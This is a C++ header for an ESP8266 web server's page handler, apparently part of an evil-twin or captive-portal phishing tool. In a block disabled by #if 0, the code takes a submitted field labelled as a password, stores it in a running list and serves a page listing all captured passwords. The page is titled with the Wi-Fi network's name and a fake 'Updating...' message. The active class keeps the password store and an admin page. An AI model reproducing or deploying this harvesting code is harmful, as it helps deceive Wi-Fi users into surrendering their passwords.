/**
 * @file webpage.hpp
 * @author Ali Nasrolahi (a.nasrolahi01@gmail.com)
 * @brief Webpage UI handler.
 * @date 2023-04-02
 */
#pragma once

#include "config.h"

#include <ESP8266WebServer.h>
#include <WString.h>

#define SUBTITLE "SOME DATA."
#define POST_TITLE "Updating..."
#define POST_BODY "BODY"
#define PASS_TITLE "Passwords"

class Webpage
{
public:
    Webpage(ESP8266WebServer *server) : server(server) {}
#if 0

    String posted()
    {
        String pass = input("m");
        pass = "<li><b>" + pass + "</li></b>"; // Adding password in a ordered list.
        allPass += pass;                       // Updating the full passwords.

        return header(POST_TITLE) + POST_BODY + footer();
    }
    String input(String argName)
    {
        String a = server->arg(argName);
        a.replace("<", "&lt;");
        a.replace(">", "&gt;");
        a.substring(0, 200);
        return a;
    }
    String pass()
    {
        return header(PASS_TITLE) + "<ol>" + allPass +
               "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a "
               "style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" +
               footer();
    }
    String header(String t)
    {
        String a = String(WIFI_SSID);
        String CSS =
            "article { background: #f2f2f2; padding: 1.3em; }"
            "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; "
            "line-height: 24px; margin: 0; padding: 0; }"
            "div { padding: 0.5em; }"
            "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
            "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; "
            "border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
            "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
            "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: "
            "1em; }"
            "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
            "textarea { width: 100%; }";
        String h = "<!DOCTYPE html><html>"
                   "<head><title>" +
                   a + " :: " + t +
                   "</title>"
                   "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                   "<style>" +
                   CSS +
                   "</style>"
                   "<meta charset=\"UTF-8\"></head>"
                   "<body><nav><b>" +
                   a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
        return h;
    }
#endif

    void index();

    void admin();

    void style();

    void script();

private:
    void loadFile(const char *file, const char *content_type = HTTP_HTML);

    ESP8266WebServer *server;

    String allPass;
};
